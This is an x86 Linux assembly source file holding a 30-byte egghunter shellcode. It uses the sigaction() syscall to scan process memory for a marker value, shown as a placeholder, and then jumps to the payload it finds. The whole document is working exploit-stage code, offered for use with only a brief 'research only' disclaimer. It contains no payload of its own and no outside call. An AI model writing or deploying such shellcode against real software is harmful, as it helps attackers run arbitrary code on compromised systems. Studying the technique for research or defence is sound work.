; Title: Linux Egghunter Shellcode
; Author Liviu I. 
;
; License http://creativecommons.org/licenses/by-sa/3.0/
; Legitimate use and research only
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE

; Uses the sigaction() syscall explained in skape's paper:
; "Safely Searching Process Virtual Address Space"

; Shellcode egghunter
; Size: 30 bytes
; Pros: small, very fast (validates 16 bytes at a time), robust
; Cons: rare odd failure situations (described in paper)

global _start			

section .text
_start:
    or cx,0xfff
next_addr:
    inc ecx                 ; Pointer t oregion to be validated
    push byte +0x43         ; sigaction() syscall number
    pop eax                 ; Syscall number in eax
    int 0x80                ; Execut ethe syscall
    cmp al,0xf2             ; Compare with EFAULT
    jz short _start         ; Go to next page
    mov eax, <EGG>          ; The egg
    mov edi,ecx             ; Prepare for comparison
    scasd                   ; Compare
    jnz short next_addr     ; Jump to next address
    scasd                   ; Compare
    jnz short next_addr     ; Jump to next address
    jmp edi                 ; Jump to shellcode
